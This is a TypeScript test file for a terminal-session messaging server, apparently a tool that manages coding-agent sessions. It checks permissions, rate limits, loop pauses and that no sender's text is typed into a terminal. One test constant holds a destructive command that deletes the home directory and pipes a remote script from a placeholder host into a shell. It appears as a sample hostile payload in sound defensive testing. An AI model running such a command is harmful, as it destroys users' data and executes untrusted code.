import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { BRIEF_LINE, GRANTABLE_SCOPES, INBOX_LINE, KICKOFF_LINE, NO_ATTENTION, NO_STATUS, RECAP_LINE, newId, paths, type ChangeEvent, type Message, type Scope, type Session } from '@aubergine/shared';
import type { FastifyInstance } from 'fastify';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ACTIVITY_FILE, FileActivityLog } from './activity';
import { sessionToken } from './auth';
import { FileInputAudit } from './input-audit';
import { FileMessageLog, MESSAGE_LOG_FILE, type MessageLine } from './message-log';
import type { SessionRuntime } from './runtime/runtime';
import { buildServer, cookieName, publicRoutesOf } from './server';
import { Sessions } from './sessions';
import { SETTINGS_FILE, SettingsFile } from './settings';
import { StateHub } from './state-hub';
import { JsonStore } from './store/json-store';
import { loadOrCreateToken } from './token';

/**
 * The rules of messages between sessions, through the routes. The runtime
 * is a stand-in that keeps everything it is asked to put into a terminal, by
 * any of its ways of typing: so the tests can say what was typed, and that
 * nothing else was.
 */

const SCREEN = 'SCREEN-SECRET-7781';
const COMMAND_LINE = 'deploy --password hunter2-9912';
const PROMPT = 'what I asked the agent: opal-3320';

let dir: string;
let ownerToken: string;
let app: FastifyInstance;
let hub: StateHub;
let sessions: Sessions;
let port: number;
let origin: string;
/** Everything the runtime was asked to put into a terminal: [session, how, what]. */
let typed: [string, string, string][] = [];
let events: ChangeEvent[] = [];
let audit = false;

const runtime = {
  check: async () => ({ status: 'ok', version: '3.4' }),
  create: async (options: { id: string }) => ({ id: options.id, cwd: null, command: null, activityAt: null }),
  list: async () => [],
  has: async () => true,
  kill: async () => {},
  typeLine: async (id: string, line: string) => void typed.push([id, 'line', line]),
  type: async (id: string, text: string, options?: { paste?: boolean }) => void typed.push([id, options?.paste ? 'paste' : 'text', text]),
  press: async (id: string, keys: string[]) => void typed.push([id, 'keys', keys.join(' ')]),
  screen: async () => ({ text: `${SCREEN}\nready> `, columns: 80, rows: 24, cursor: { x: 7, y: 1 }, line: 1 }),
  lines: async () => ({ lines: [SCREEN, 'ready> '], more: false, lost: false }),
  search: async (ids: string[]) => ({ hits: ids.map((sessionId) => ({ sessionId, text: SCREEN, before: [], after: [] })), truncated: false }),
  foreground: async () => 'zsh',
  snapshot: async () => SCREEN,
} as unknown as SessionRuntime;

async function start(settingsJson: object = {}): Promise<void> {
  await writeFile(path.join(dir, SETTINGS_FILE), JSON.stringify(settingsJson));
  const store = new JsonStore(dir);
  hub = new StateHub(await store.load(), store);
  events = [];
  hub.subscribe((event) => events.push(event));
  const settings = new SettingsFile(dir);
  await settings.reload();
  sessions = new Sessions(hub, runtime, { protectByDefault: () => ({ all: settings.value.terminal.protectNewSessions, agents: settings.value.terminal.protectAgentSessions }) });
  app = await buildServer({
    hub,
    sessions,
    runtime,
    settings: () => settings.reload(),
    token: ownerToken,
    devOrigin: null,
    webDist: path.join(dir, 'none'),
    activity: new FileActivityLog(dir, 1024 * 1024),
    inputAudit: new FileInputAudit(dir, () => audit),
    messageLog: new FileMessageLog(dir, () => 4 * 1024 * 1024),
  });
  await app.listen({ host: '127.0.0.1', port: 0 });
  port = (app.server.address() as AddressInfo).port;
  origin = `http://127.0.0.1:${port}`;
}
async function stop(): Promise<void> {
  await hub.flush();
  await app.close();
}
beforeEach(async () => {
  dir = await mkdtemp(path.join(os.tmpdir(), 'aubergine-messages-'));
  ownerToken = await loadOrCreateToken(dir);
  typed = [];
  audit = false;
  await start();
});
afterEach(async () => {
  await stop();
  await rm(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 });
});

interface Answer {
  status: number;
  body: any; // eslint-disable-line @typescript-eslint/no-explicit-any -- test answers are checked field by field
  text: string;
  headers: Record<string, unknown>;
}
async function send(headers: Record<string, string>, method: string, url: string, body?: unknown): Promise<Answer> {
  const response = await app.inject({ method: method as 'GET', url, headers: { host: `127.0.0.1:${port}`, ...headers }, ...(body === undefined ? {} : { payload: body as object }) });
  let parsed: unknown = null;
  try {
    parsed = response.body ? JSON.parse(response.body) : null;
  } catch {
    // Not JSON: the text is kept as it is.
  }
  return { status: response.statusCode, body: parsed, text: response.body, headers: response.headers };
}
const asOwner = (method: string, url: string, body?: unknown): Promise<Answer> => send({ origin, cookie: `${cookieName(port)}=${ownerToken}`, 'sec-fetch-site': 'same-origin' }, method, url, body);
const asCommand = (method: string, url: string, body?: unknown): Promise<Answer> => send({ origin, cookie: `${cookieName(port)}=${ownerToken}` }, method, url, body);
const call = (secret: string, method: string, url: string, body?: unknown): Promise<Answer> => send({ authorization: `Bearer ${secret}` }, method, url, body);

async function makeToken(name: string, scopes: Scope[], reach: object | null = { kind: 'all' }): Promise<string> {
  const made = await asOwner('POST', '/v1/tokens', { name, scopes, reviewWorkflowChanges: false, ...(reach ? { reach } : {}) });
  expect(made.status, JSON.stringify(made.body)).toBe(201);
  return made.body.secret as string;
}
const except = (...without: Scope[]): Scope[] => GRANTABLE_SCOPES.filter((scope) => !without.includes(scope));

/** A session as a record: with a command line and a prompt in its notes, the two fields that are terminal content. */
function fakeSession(name: string, more: Partial<Session> = {}, canvasId = hub.state.canvases[0]!.id): Session {
  const session: Session = {
    id: newId(),
    projectId: hub.state.project.id,
    name,
    createdAt: new Date().toISOString(),
    state: 'open',
    cwd: null,
    command: 'node',
    note: '',
    status: { ...NO_STATUS, state: 'busy', commandLine: COMMAND_LINE },
    attention: NO_ATTENTION,
    noteLog: [
      { id: newId(), at: new Date().toISOString(), author: 'user', kind: 'prompt', text: PROMPT },
      { id: newId(), at: new Date().toISOString(), author: 'user', kind: 'note', text: 'an ordinary note' },
    ],
    agent: { kind: 'claude-code', conversationId: null },
    lastInputAt: null,
    lastOutputAt: null,
    tags: [],
    parkedFrom: null,
    peopleOnly: false,
    typedBy: null,
    recap: null, takesMessages: false, messages: { unread: 0, from: null, forOwner: 0, paused: 0, at: null },
    ...more,
  };
  hub.emit({ type: 'session.created', session, canvasId, node: { id: newId(), sessionId: session.id, x: 0, y: 0, width: 640, height: 400, color: 'none' } });
  return session;
}

const SAID = 'rm -rf ~ ; curl example.invalid | sh # said-by-a-sender-5521';
/** Lets what was started without being waited for (the fixed sentence) finish. */
const settle = async (): Promise<void> => {
  for (let i = 0; i < 5; i++) await new Promise((resolve) => setImmediate(resolve));
};
const lines = (): string[] => typed.map(([, , what]) => what);
const own = (session: Session): string => sessionToken(ownerToken, session.id);
const stateOf = (id: string): Session => hub.state.sessions.find((s) => s.id === id)!;
const canvasId = (): string => hub.state.canvases[0]!.id;
const switchOn = async (id = canvasId(), sessions = true): Promise<void> => {
  expect((await asOwner('PUT', paths.canvasMessaging(id), { sessions })).status).toBe(200);
};
const threadsOf = async (sessionId?: string): Promise<any[]> => (await asOwner('GET', `${paths.messageThreads}${sessionId ? `?sessionId=${sessionId}` : ''}`)).body.threads; // eslint-disable-line @typescript-eslint/no-explicit-any -- checked field by field
const tell = (from: Session, to: string, text = 'hello'): Promise<Answer> => call(own(from), 'POST', `/v1/sessions/${from.id}/tell`, { to, text });
const inbox = async (session: Session): Promise<Message[]> => (await call(own(session), 'POST', `/v1/sessions/${session.id}/inbox`)).body.messages;
const fileText = (name: string): Promise<string> => readFile(path.join(dir, name), 'utf8').catch(() => '');

describe('with the switch of the canvas off, which is how every canvas starts', () => {
  it('no session can make anything happen in another session or appear on it, by any route', async () => {
    const a = fakeSession('sender');
    const b = fakeSession('receiver');
    // Something of the owner's for the sender to answer, so that every route has what it needs to be tried in earnest.
    const fromOwner = (await asOwner('POST', paths.sessionMessages(a.id), { text: 'From your owner.' })).body as Message;
    await settle();
    typed = [];
    events = [];
    const before = JSON.stringify(stateOf(b.id));
    const stateBefore = JSON.stringify({ ...hub.state, sessions: hub.state.sessions.filter((s) => s.id !== a.id) });

    const bodies: (object | undefined)[] = [undefined, {}, { to: b.id, text: SAID }, { to: b.name, text: SAID }, { text: SAID }, { text: SAID, replyTo: fromOwner.id }, { text: SAID, enter: true }, { state: 'waiting', message: SAID }];
    let tried = 0;
    for (const route of publicRoutesOf(app)) {
      if (route.url === '/v1/events') continue;
      for (const target of [b.id, a.id]) {
        for (const body of bodies) {
          if ((route.method === 'GET' || route.method === 'DELETE') && body !== undefined) continue;
          // Every ID in the address is the other session's, or one of the sender's own messages: whichever could reach furthest.
          const url = route.url.replace(':sessionId', target).replace(':messageId', fromOwner.id).replace(':canvasId', canvasId()).replace(/:[A-Za-z]+/g, () => newId());
          const answer = await call(own(a), route.method, url, body);
          expect(answer.status, `${route.method} ${route.url}`).not.toBe(500);
          if (target === b.id && route.url.includes(':sessionId')) expect(answer.status, `${route.method} ${route.url} on the other session`).toBe(403);
          tried += 1;
        }
      }
    }
    expect(tried).toBeGreaterThan(300);
    await settle();

    // Nothing was typed into the other terminal, nothing about it changed, no event names it, and it has no message.
    expect(typed.filter(([id]) => id === b.id)).toEqual([]);
    expect(JSON.stringify(stateOf(b.id))).toBe(before);
    expect(JSON.stringify({ ...hub.state, sessions: hub.state.sessions.filter((s) => s.id !== a.id) })).toBe(stateBefore);
    expect(events.filter((event) => 'sessionId' in event && event.sessionId === b.id)).toEqual([]);
    expect(await threadsOf(b.id)).toEqual([]);
    expect(await inbox(b)).toEqual([]);
    expect(await fileText(MESSAGE_LOG_FILE)).not.toContain(`"s.${b.id}"`);
    expect(await fileText(MESSAGE_LOG_FILE)).not.toContain(b.id);
  });

  it('a session is refused in the same words for a terminal it may not message and for one that is not there', async () => {
    const a = fakeSession('sender');
    const b = fakeSession('receiver');
    const refused = await tell(a, b.id);
    expect(refused.status).toBe(403);
    expect(refused.body.error.code).toBe('forbidden');
    expect(refused.body.error.message).toMatch(/only on a canvas where the owner switched that on/);
    for (const to of [b.name, newId(), 'nobody by this name', a.id, a.name]) expect((await tell(a, to)).body, to).toEqual(refused.body);
  });

  it('a session may always answer its owner, and the owner sees the answer', async () => {
    const a = fakeSession('asked');
    const sent = (await asOwner('POST', paths.sessionMessages(a.id), { text: 'Which branch?' })).body as Message;
    expect(stateOf(a.id).messages).toMatchObject({ unread: 1, from: 'you' });
    const got = await inbox(a);
    expect(got.map((m) => [m.id, m.text, m.from.kind])).toEqual([[sent.id, 'Which branch?', 'owner']]);
    expect(stateOf(a.id).messages.unread).toBe(0);
    const answer = await call(own(a), 'POST', `/v1/sessions/${a.id}/messages/${sent.id}/reply`, { text: 'main' });
    expect(answer.status).toBe(201);
    expect(answer.body).toMatchObject({ to: { kind: 'owner' }, replyTo: sent.id, threadId: sent.threadId });
    expect(stateOf(a.id).messages.forOwner).toBe(1);
    const [thread] = await threadsOf(a.id);
    expect(thread).toMatchObject({ total: 2, forOwner: 1, state: 'open', turns: 0 });
    // Looking at it reads what was for the owner.
    await asOwner('POST', paths.messageThread(thread.id), { action: 'look' });
    expect(stateOf(a.id).messages.forOwner).toBe(0);
    // A message that was not sent to it cannot be answered, and is refused like one that does not exist.
    const other = fakeSession('other');
    const forOther = (await asOwner('POST', paths.sessionMessages(other.id), { text: 'For the other.' })).body as Message;
    const wrong = await call(own(a), 'POST', `/v1/sessions/${a.id}/messages/${forOther.id}/reply`, { text: 'not mine' });
    const missing = await call(own(a), 'POST', `/v1/sessions/${a.id}/messages/${newId()}/reply`, { text: 'not there' });
    expect(wrong.status).toBe(404);
    expect(wrong.body).toEqual(missing.body);
  });
});

describe('the switch of a canvas', () => {
  it('is the owner\'s alone, and puts only the canvas itself on its list', async () => {
    const a = fakeSession('a');
    const everything = await makeToken('everything', [...GRANTABLE_SCOPES]);
    const url = paths.canvasMessaging(canvasId());
    // No token, whatever its scopes.
    expect([401, 403]).toContain((await call(everything, 'PUT', url, { sessions: true })).status);
    // A session's own credential is refused as well.
    expect([401, 403]).toContain((await call(own(a), 'PUT', url, { sessions: true })).status);
    expect(hub.state.canvases[0]!.messagesFrom).toEqual([]);
    // No public route changes it either: what a token may change about a canvas does not include it.
    const other = (await asOwner('POST', '/v1/canvases', { name: 'Other' })).body.id as string;
    await call(everything, 'PATCH', `/v1/canvases/${canvasId()}`, { name: 'Renamed', messagesFrom: [canvasId(), other] });
    expect(hub.state.canvases[0]).toMatchObject({ name: 'Renamed', messagesFrom: [] });
    // The owner: on, and nothing but the canvas's own ID however the body is filled.
    expect((await asOwner('PUT', url, { sessions: true, messagesFrom: [other], canvases: [other] })).status).toBe(200);
    expect(hub.state.canvases[0]!.messagesFrom).toEqual([canvasId()]);
    await switchOn(canvasId(), false);
    expect(hub.state.canvases[0]!.messagesFrom).toEqual([]);
  });

  it('lets the terminals of that canvas message each other, and no terminal of another canvas', async () => {
    const elsewhere = (await asOwner('POST', '/v1/canvases', { name: 'Elsewhere' })).body.id as string;
    const a = fakeSession('a');
    const b = fakeSession('b');
    const far = fakeSession('far', {}, elsewhere);
    await switchOn();
    expect((await tell(a, b.name, 'by name')).status).toBe(201);
    expect((await tell(a, b.id, 'by ID')).status).toBe(201);
    expect((await inbox(b)).map((m) => [m.text, m.from.kind === 'session' && m.from.name])).toEqual([
      ['by name', 'a'],
      ['by ID', 'a'],
    ]);
    // Across canvases: neither way, though one of the two is switched on, and then though both are.
    expect((await tell(a, far.id)).status).toBe(403);
    expect((await tell(far, a.id)).status).toBe(403);
    await switchOn(elsewhere);
    expect((await tell(a, far.id)).status).toBe(403);
    expect((await tell(far, a.id)).status).toBe(403);
    expect(await inbox(far)).toEqual([]);
    // A parked terminal is on no canvas: it can neither send nor be sent to.
    await asOwner('POST', `/v1/sessions/${b.id}/park`);
    expect((await tell(a, b.id)).status).toBe(403);
    expect((await tell(b, a.id)).status).toBe(403);
    // A session cannot message itself.
    expect((await tell(a, a.id)).status).toBe(403);
    // Switched off again: an answer to a message that was let through is refused too.
    const c = fakeSession('c');
    expect((await tell(a, c.id, 'before')).status).toBe(201);
    const [received] = await inbox(c);
    await switchOn(canvasId(), false);
    expect((await call(own(c), 'POST', `/v1/sessions/${c.id}/messages/${received!.id}/reply`, { text: 'after' })).status).toBe(403);
  });
});

describe('nothing a sender wrote is typed', () => {
  it('into any terminal: what is typed is one of the four fixed sentences, whoever sent what', async () => {
    const a = fakeSession('a');
    const b = fakeSession('b');
    await switchOn();
    const typist = await makeToken('may type', ['messages:write', 'terminal:input']);
    const quiet = await makeToken('may not type', ['messages:write', 'messages:read']);
    await asOwner('POST', paths.sessionMessages(b.id), { text: SAID });
    await tell(a, b.id, SAID);
    await call(typist, 'POST', `/v1/sessions/${b.id}/messages`, { text: SAID });
    await call(quiet, 'POST', `/v1/sessions/${a.id}/messages`, { text: SAID });
    await settle();
    const received = await inbox(b);
    for (const message of received) await call(own(b), 'POST', `/v1/sessions/${b.id}/messages/${message.id}/reply`, { text: SAID });
    await settle();
    await asOwner('POST', paths.messageThread((await threadsOf(b.id))[0].id), { action: 'continue' });
    await settle();

    expect(lines().length).toBeGreaterThan(0);
    const fixed = [KICKOFF_LINE, BRIEF_LINE, RECAP_LINE, INBOX_LINE];
    for (const [, how, what] of typed) {
      expect(how).toBe('line');
      expect(fixed).toContain(what);
    }
    expect(JSON.stringify(typed)).not.toContain('5521');
    // And the sentence itself holds nothing of any message, sender or terminal.
    expect(INBOX_LINE).toBe('There is a message for this session in Aubergine. Run `aubergine inbox` to read it.');
  });

  it('a token types nothing by a message unless it may type into that very terminal', async () => {
    const agent = fakeSession('agent', { tags: ['ci'] });
    const quiet = await makeToken('messages only', ['messages:write']);
    const elsewhere = await makeToken('types elsewhere', ['messages:write', 'terminal:input'], { kind: 'tag', tag: 'ci' });
    const other = fakeSession('untagged');
    expect((await call(quiet, 'POST', `/v1/sessions/${agent.id}/messages`, { text: 'one' })).status).toBe(201);
    await settle();
    // Kept and counted, and nothing typed: not now, and not later when something else happens there.
    expect(stateOf(agent.id).messages).toMatchObject({ unread: 1, from: 'messages only' });
    await call(own(agent), 'PUT', `/v1/sessions/${agent.id}/attention`, { state: 'done' });
    await settle();
    expect(typed).toEqual([]);
    // Out of reach is said, and said the same about a session that is not there.
    const out = await call(elsewhere, 'POST', `/v1/sessions/${other.id}/messages`, { text: 'two' });
    expect(out.status).toBe(403);
    expect(out.body.error.code).toBe('out_of_reach');
    expect((await call(elsewhere, 'POST', `/v1/sessions/${newId()}/messages`, { text: 'two' })).body).toEqual(out.body);
    // Within reach, with input: the one sentence.
    expect((await call(elsewhere, 'POST', `/v1/sessions/${agent.id}/messages`, { text: 'three' })).status).toBe(201);
    await settle();
    expect(typed).toEqual([[agent.id, 'line', INBOX_LINE]]);
  });
});

describe('the sentence that says a message waits', () => {
  const ownerSays = async (session: Session, text = 'hello'): Promise<void> => {
    expect((await asOwner('POST', paths.sessionMessages(session.id), { text })).status).toBe(201);
    await settle();
  };

  it('is not typed into a plain shell, at a shell prompt, while an agent works or waits on a question, or over what a person is typing', async () => {
    const plain = fakeSession('plain shell', { agent: null });
    const atPrompt = fakeSession('agent gone, shell at its prompt', { status: { ...NO_STATUS, state: 'idle' } });
    const working = fakeSession('working', { attention: { ...NO_ATTENTION, state: 'working' } });
    const asking = fakeSession('asking', { attention: { ...NO_ATTENTION, state: 'waiting' } });
    const typing = fakeSession('someone is typing', { lastInputAt: new Date().toISOString() });
    const ended = fakeSession('ended', { state: 'exited' });
    for (const session of [plain, atPrompt, working, asking, typing, ended]) {
      await ownerSays(session);
      expect(stateOf(session.id).messages.unread, session.name).toBe(1);
    }
    expect(typed).toEqual([]);
    // When the agent has finished, it is told then.
    await call(own(working), 'PUT', `/v1/sessions/${working.id}/attention`, { state: 'done' });
    await settle();
    expect(typed).toEqual([[working.id, 'line', INBOX_LINE]]);
  });

  it('is typed once for a batch of unread messages, and not again within the interval after they were read', async () => {
    const agent = fakeSession('idle agent');
    await ownerSays(agent, 'one');
    await ownerSays(agent, 'two');
    await ownerSays(agent, 'three');
    await call(own(agent), 'PUT', `/v1/sessions/${agent.id}/attention`, { state: 'done' });
    await settle();
    expect(typed).toEqual([[agent.id, 'line', INBOX_LINE]]);
    expect((await inbox(agent)).map((m) => m.text)).toEqual(['one', 'two', 'three']);
    // A new batch, moments later: counted, not announced yet.
    await ownerSays(agent, 'four');
    expect(stateOf(agent.id).messages.unread).toBe(1);
    expect(typed).toEqual([[agent.id, 'line', INBOX_LINE]]);
  });
});

describe('"people only"', () => {
  it('closes a session to messages from sessions and from tokens, and not to the owner', async () => {
    const a = fakeSession('a');
    const closed = fakeSession('closed', { peopleOnly: true });
    await switchOn();
    const token = await makeToken('every scope', [...GRANTABLE_SCOPES]);
    expect((await tell(a, closed.id)).status).toBe(403);
    expect((await tell(a, closed.name)).status).toBe(403);
    const refused = await call(token, 'POST', `/v1/sessions/${closed.id}/messages`, { text: 'hello' });
    expect(refused.status).toBe(403);
    expect(refused.body.error.code).toBe('people_only');
    expect((await call(token, 'GET', `/v1/sessions/${closed.id}/messages`)).body.error.code).toBe('people_only');
    expect(stateOf(closed.id).messages.unread).toBe(0);
    expect((await asOwner('POST', paths.sessionMessages(closed.id), { text: 'From the owner.' })).status).toBe(201);
    expect(stateOf(closed.id).messages.unread).toBe(1);
    // It may still answer its owner, and may itself message a terminal that is open.
    const [received] = await inbox(closed);
    expect((await call(own(closed), 'POST', `/v1/sessions/${closed.id}/messages/${received!.id}/reply`, { text: 'yes' })).status).toBe(201);
    expect((await tell(closed, a.id)).status).toBe(201);
    // But the answer to that is closed again.
    const [got] = await inbox(a);
    expect((await call(own(a), 'POST', `/v1/sessions/${a.id}/messages/${got!.id}/reply`, { text: 'back' })).status).toBe(403);
    expect(typed.filter(([id]) => id === closed.id).map(([, , what]) => what)).toEqual([INBOX_LINE]);
  });
});

describe('a terminal that is "people only" and takes messages', () => {
  it('takes them from terminals the owner let message it, stays closed to tokens, and only the owner says so', async () => {
    const a = fakeSession('a');
    const closed = fakeSession('closed', { peopleOnly: true });
    await switchOn();
    const token = await makeToken('every scope', [...GRANTABLE_SCOPES]);
    const url = `/v1/sessions/${closed.id}/takes-messages`;
    // Neither a token, nor the session itself, nor another session.
    for (const secret of [token, own(closed), own(a)]) expect((await call(secret, 'PUT', url, { takesMessages: true })).status).toBe(403);
    expect(stateOf(closed.id).takesMessages).toBe(false);
    expect((await tell(a, closed.id)).status).toBe(403);
    expect((await asOwner('PUT', url, { takesMessages: true })).status).toBe(200);
    expect(stateOf(closed.id)).toMatchObject({ takesMessages: true, peopleOnly: true });
    expect((await tell(a, closed.id, 'now it may')).status).toBe(201);
    expect((await inbox(closed)).map((m) => m.text)).toEqual(['now it may']);
    // Messages only: reading, typing and every token are as closed as before.
    for (const [method, path, body] of [
      ['POST', `/v1/sessions/${closed.id}/messages`, { text: 'from a program' }],
      ['GET', `/v1/sessions/${closed.id}/messages`, undefined],
      ['GET', `/v1/sessions/${closed.id}/screen`, undefined],
      ['POST', `/v1/sessions/${closed.id}/input`, { text: 'echo', enter: true }],
    ] as const) {
      const refused = await call(token, method, path, body);
      expect(refused.status, path).toBe(403);
      expect(refused.body.error.code, path).toBe('people_only');
    }
    // With the canvas switched off it takes none, whatever the terminal says.
    await switchOn(canvasId(), false);
    expect((await tell(a, closed.id)).status).toBe(403);
    await switchOn();
    await asOwner('PUT', url, { takesMessages: false });
    expect((await tell(a, closed.id)).status).toBe(403);
  });
});

describe('who reads what', () => {
  it('a session takes only the messages sent to it', async () => {
    const a = fakeSession('a');
    const b = fakeSession('b');
    await asOwner('POST', paths.sessionMessages(a.id), { text: 'for a' });
    await asOwner('POST', paths.sessionMessages(b.id), { text: 'for b' });
    expect((await call(own(a), 'POST', `/v1/sessions/${b.id}/inbox`)).status).toBe(403);
    expect((await call(own(a), 'GET', `/v1/sessions/${a.id}/messages`)).status).toBe(403);
    expect((await call(own(a), 'GET', `/v1/sessions/${b.id}/messages`)).status).toBe(403);
    expect([401, 403]).toContain((await call(own(a), 'GET', paths.messageThreads)).status);
    expect((await inbox(a)).map((m) => m.text)).toEqual(['for a']);
    expect(stateOf(b.id).messages.unread).toBe(1);
  });

  it('a token reads only with the scope for it, only within its reach, and marks nothing read', async () => {
    const tagged = fakeSession('tagged', { tags: ['ci'] });
    const other = fakeSession('other');
    await asOwner('POST', paths.sessionMessages(tagged.id), { text: 'for the tagged one' });
    await asOwner('POST', paths.sessionMessages(other.id), { text: 'for the other one' });
    const reader = await makeToken('reader', ['messages:read'], { kind: 'tag', tag: 'ci' });
    // Every scope but the one for reading messages, `read` among them: nothing.
    const without = await makeToken('everything else', except('messages:read'));
    for (const id of [tagged.id, other.id]) expect((await call(without, 'GET', `/v1/sessions/${id}/messages`)).status).toBe(403);
    const mine = await call(reader, 'GET', `/v1/sessions/${tagged.id}/messages`);
    expect(mine.status).toBe(200);
    expect(mine.body.items.map((m: Message) => [m.text, m.readAt])).toEqual([['for the tagged one', null]]);
    expect(stateOf(tagged.id).messages.unread).toBe(1);
    const out = await call(reader, 'GET', `/v1/sessions/${other.id}/messages`);
    expect(out.body.error.code).toBe('out_of_reach');
    expect((await call(reader, 'GET', `/v1/sessions/${newId()}/messages`)).body).toEqual(out.body);
    // No token takes a session's inbox, speaks as a session, or sees the threads as the owner does.
    expect((await call(without, 'POST', `/v1/sessions/${tagged.id}/inbox`)).status).toBe(403);
    expect((await call(reader, 'POST', `/v1/sessions/${tagged.id}/inbox`)).status).toBe(403);
    expect((await call(without, 'POST', `/v1/sessions/${tagged.id}/tell`, { to: other.id, text: 'as it' })).status).toBe(403);
    expect([401, 403]).toContain((await call(without, 'GET', paths.messageThreads)).status);
    // A message scope without a reach is not a token that can be made.
    expect((await asOwner('POST', '/v1/tokens', { name: 'no reach', scopes: ['messages:write'] })).status).toBe(400);
    // And no change event tells a token what a message said: the events carry counts only.
    expect(JSON.stringify(events)).not.toContain('for the tagged one');
  });
});

describe('loops and floods', () => {
  it('a thread between two terminals pauses after so many messages without the owner looking, and both are told why', async () => {
    await stop();
    await start({ messages: { pauseAfter: 4, perSenderPerMinute: 100 } });
    const a = fakeSession('a');
    const b = fakeSession('b');
    await switchOn();
    const sent: number[] = [];
    for (let i = 0; i < 4; i++) sent.push((await tell(i % 2 === 0 ? a : b, i % 2 === 0 ? b.id : a.id, `turn ${i}`)).status);
    expect(sent).toEqual([201, 201, 201, 201]);
    await settle();
    const refused = await tell(a, b.id, 'one more');
    expect(refused.status).toBe(409);
    expect(refused.body.error.message).toMatch(/paused until the owner has looked at it: 4 messages have passed/);
    expect((await tell(b, a.id, 'and back')).status).toBe(409);
    expect(stateOf(a.id).messages.paused).toBe(1);
    expect(stateOf(b.id).messages.paused).toBe(1);
    const [thread] = await threadsOf(a.id);
    expect(thread).toMatchObject({ state: 'paused', turns: 4, pauseAfter: 4, total: 4 });
    // The message that reached the limit is kept and nobody was told to go and read it: three sentences, not four.
    expect(lines()).toEqual([INBOX_LINE, INBOX_LINE]);
    // The owner lets it go on: the count starts again, and what waited is announced.
    typed = [];
    expect((await asOwner('POST', paths.messageThread(thread.id), { action: 'continue' })).body.thread).toMatchObject({ state: 'open', turns: 0 });
    expect(stateOf(a.id).messages.paused).toBe(0);
    expect((await tell(a, b.id, 'on again')).status).toBe(201);
    // The owner looking at an open thread starts the count again too.
    await asOwner('POST', paths.messageThread(thread.id), { action: 'look' });
    expect((await threadsOf(a.id))[0].turns).toBe(0);
    // Stopped: nothing more passes, either way. The owner still can.
    await asOwner('POST', paths.messageThread(thread.id), { action: 'stop' });
    const stopped = await tell(b, a.id, 'after the stop');
    expect(stopped.status).toBe(409);
    expect(stopped.body.error.message).toMatch(/has stopped this thread/);
    expect((await asOwner('POST', paths.sessionMessages(a.id), { text: 'From the owner, still.' })).status).toBe(201);
  });

  it('limits a sender by the minute and a pair by the hour, with when to try again', async () => {
    await stop();
    await start({ messages: { perSenderPerMinute: 3, perPairPerHour: 5, pauseAfter: 1000, maxUnread: 1000 } });
    const a = fakeSession('a');
    const b = fakeSession('b');
    const c = fakeSession('c');
    await switchOn();
    expect([(await tell(a, b.id)).status, (await tell(a, c.id)).status, (await tell(a, b.id)).status]).toEqual([201, 201, 201]);
    const limited = await tell(a, c.id);
    expect(limited.status).toBe(429);
    expect(limited.body.error.code).toBe('rate_limited');
    expect(Number(limited.headers['retry-after'])).toBeGreaterThan(0);
    expect(limited.body.error.message).toMatch(/3 messages in the last minute/);
    // The pair: both ways together.
    expect([(await tell(b, a.id)).status, (await tell(b, a.id)).status, (await tell(b, a.id)).status]).toEqual([201, 201, 201]);
    const pair = await tell(c, a.id);
    expect(pair.status).toBe(201);
    const token = await makeToken('floods', ['messages:write']);
    const statuses: number[] = [];
    for (let i = 0; i < 5; i++) statuses.push((await call(token, 'POST', `/v1/sessions/${a.id}/messages`, { text: `flood ${i}` })).status);
    expect(statuses).toEqual([201, 201, 201, 429, 429]);
    // Nothing limits the owner.
    for (let i = 0; i < 6; i++) expect((await asOwner('POST', paths.sessionMessages(a.id), { text: `owner ${i}` })).status).toBe(201);
  });

  it('refuses one more message to a session that has too many unread, a blocked sender, and a message that is too long', async () => {
    await stop();
    await start({ messages: { maxUnread: 2, perSenderPerMinute: 100, pauseAfter: 1000 } });
    const a = fakeSession('a');
    const b = fakeSession('b', { agent: null });
    await switchOn();
    expect([(await tell(a, b.id)).status, (await tell(a, b.id)).status]).toEqual([201, 201]);
    const full = await tell(a, b.id);
    expect(full.status).toBe(409);
    expect(full.body.error.message).toMatch(/2 unread messages/);
    await inbox(b);
    expect((await tell(a, b.id)).status).toBe(201);
    // Blocked by the owner, for this one receiver.
    expect((await asOwner('POST', paths.sessionMessageBlocks(b.id), { sender: `s.${a.id}`, blocked: true })).status).toBe(200);
    const blocked = await tell(a, b.id);
    expect(blocked.status).toBe(403);
    expect(blocked.body.error.message).toMatch(/closed that terminal to your messages/);
    expect((await threadsOf(b.id))[0].blocks).toEqual([{ sessionId: b.id, sender: `s.${a.id}` }]);
    expect((await tell(b, a.id)).status).toBe(201);
    await asOwner('POST', paths.sessionMessageBlocks(b.id), { sender: `s.${a.id}`, blocked: false });
    await inbox(b);
    expect((await tell(a, b.id)).status).toBe(201);
    expect((await tell(a, b.id, 'x'.repeat(4001))).status).toBe(400);
    // Answers to the owner wait for the owner, and only so many of them.
    const asked = (await asOwner('POST', paths.sessionMessages(a.id), { text: 'Tell me when it is done.' })).body as Message;
    const answers: number[] = [];
    for (let i = 0; i < 3; i++) answers.push((await call(own(a), 'POST', `/v1/sessions/${a.id}/messages/${asked.id}/reply`, { text: `done ${i}` })).status);
    expect(answers).toEqual([201, 201, 409]);
    expect((await tell(a, b.id, '   ')).status).toBe(400);
  });
});

describe('what is recorded', () => {
  it('a token\'s sending and reading are in the activity log with a length and a fingerprint, never the text; the owner\'s from outside the browser too', async () => {
    const a = fakeSession('a');
    const token = await makeToken('bot', ['messages:write', 'messages:read']);
    await call(token, 'POST', `/v1/sessions/${a.id}/messages`, { text: SAID });
    await call(token, 'GET', `/v1/sessions/${a.id}/messages`);
    const fromCommand = await asCommand('POST', paths.sessionMessages(a.id), { text: SAID });
    expect(fromCommand.status).toBe(201);
    // Said with the message itself, where it will be read: it did not come from the page.
    expect(fromCommand.body.from).toEqual({ kind: 'owner', via: 'command' });
    expect((await asOwner('POST', paths.sessionMessages(a.id), { text: 'from the page' })).body.from).toEqual({ kind: 'owner', via: 'page' });
    await stop();
    const activity = (await fileText(ACTIVITY_FILE)).split('\n').filter(Boolean).map((line) => JSON.parse(line));
    expect(activity.map((entry) => [entry.caller, entry.method, entry.status, entry.chars])).toEqual([
      ['token', 'POST', 201, SAID.length],
      ['token', 'GET', 200, SAID.length],
      ['owner-cli', 'POST', 201, null],
    ]);
    void fromCommand;
    expect(activity[0].fingerprint).toMatch(/^[0-9a-f]{12}$/);
    expect(await fileText(ACTIVITY_FILE)).not.toContain('5521');
